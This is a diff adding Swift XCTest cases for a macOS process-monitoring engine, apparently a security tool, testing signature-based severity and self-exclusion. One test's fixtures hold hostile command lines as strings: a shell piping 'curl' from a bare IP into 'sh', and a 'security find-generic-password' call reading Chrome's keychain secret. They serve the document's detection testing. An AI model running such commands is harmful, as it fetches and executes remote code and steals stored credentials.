@@ -100,3 +100,69 @@ final class SentinelEngineTests: XCTestCase {
         XCTAssertEqual(first.revision, second.revision, "a quiet tick must not republish the Security page")
     }
 }
+
+extension SentinelEngineTests {
+    private func listener(_ pid: Int32, path: String, port: Int) -> ProcessMetrics {
+        let forensics = ProcessForensics(currentDirectory: nil, rootDirectory: nil, openFileCount: nil, socketCount: 1,
+                                         listeningPorts: [port], isPartial: false, notes: [])
+        return ProcessMetrics(identity: ProcessIdentity(pid: pid, startTimeSeconds: 100, startTimeMicroseconds: UInt64(pid)),
+                              parentPID: 1, userID: 501, ownerName: "me", name: "server", executablePath: path,
+                              commandLine: path, residentMemoryBytes: 10_000_000, physicalFootprintBytes: 10_000_000,
+                              virtualMemoryBytes: 20_000_000, cpuPercent: 0, totalProcessorSeconds: 1, threadCount: 1,
+                              isSystemProcess: false, sampledAt: now, forensics: forensics)
+    }
+
+    /// Rules that weigh the signer run again once it is read: an
+    /// Apple-signed program listening from /tmp loses the listener alarm it
+    /// carried while its signature was unknown.
+    func testSignatureArrivingLaterRevisitsTheVerdict() async throws {
+        let folder = URL(fileURLWithPath: "/private/tmp/sentinel-\(UUID().uuidString.prefix(8))")
+        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: folder) }
+        let copy = folder.appendingPathComponent("server").path
+        try FileManager.default.copyItem(atPath: "/usr/bin/true", toPath: copy)
+        let server = listener(99_901, path: copy, port: 8080)
+
+        let unknown = SentinelEngine(live: .rulesOnly)
+        _ = await unknown.ingest(processes: baseline, uiVisible: true, now: now)
+        let before = await unknown.ingest(processes: baseline + [server], uiVisible: true, now: now.addingTimeInterval(1))
+        XCTAssertTrue(before.findings.first?.signals.contains { $0.kind == .tunnel } ?? false, "unknown signer: a look, not an alarm")
+        XCTAssertEqual(before.findings.first?.severity, .suspicious)
+
+        let engine = SentinelEngine(live: SentinelEngine.Live(watchesSpawns: false, readsSensors: false, inspectsSignatures: true,
+                                                             watchesStartupItems: false))
+        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
+        var report = await engine.ingest(processes: baseline + [server], uiVisible: true, now: now.addingTimeInterval(1))
+        for tick in 2..<60 where report.findings.first?.signing == nil {
+            try await Task.sleep(for: .milliseconds(50))
+            report = await engine.ingest(processes: baseline + [server], uiVisible: true, now: now.addingTimeInterval(Double(tick)))
+        }
+        let finding = try XCTUnwrap(report.findings.first)
+        XCTAssertEqual(finding.signing?.authority, .apple)
+        XCTAssertFalse(finding.signals.contains { $0.kind == .tunnel }, "\(finding.signals)")
+        XCTAssertEqual(finding.severity, .suspicious, "still a program running from /tmp")
+    }
+}
+
+extension SentinelEngineTests {
+    /// Ghost run from its mounted disk image, and a shell it started, are
+    /// never judged; the same processes belonging to anyone else are.
+    func testGhostNeverJudgesItselfOrWhatItStarts() async {
+        let ghost = process(700, "Ghost Process Sniper",
+                            "/Volumes/Ghost Process Sniper/Ghost Process Sniper.app/Contents/MacOS/Ghost Process Sniper")
+        let child = process(701, "sh", "/bin/sh", command: "/bin/sh -c curl -s http://1.2.3.4/a | sh", parent: 700)
+        let grandchild = process(702, "security", "/usr/bin/security",
+                                 command: "security find-generic-password -wa 'Chrome Safe Storage'", parent: 701)
+
+        let other = SentinelEngine(live: .rulesOnly, ownPID: 1_234)
+        _ = await other.ingest(processes: baseline, uiVisible: true, now: now)
+        let flagged = await other.ingest(processes: baseline + [ghost, child, grandchild], uiVisible: true, now: now.addingTimeInterval(1))
+        XCTAssertEqual(Set(flagged.findings.map(\.identity.pid)), [700, 701, 702], "the fixtures are findings for anyone else")
+
+        let engine = SentinelEngine(live: .rulesOnly, ownPID: 700)
+        _ = await engine.ingest(processes: baseline, uiVisible: true, now: now)
+        let report = await engine.ingest(processes: baseline + [ghost, child, grandchild], uiVisible: true, now: now.addingTimeInterval(1))
+        XCTAssertTrue(report.findings.isEmpty, "\(report.findings.map(\.headline))")
+        XCTAssertTrue(report.launches.isEmpty)
+    }
+}
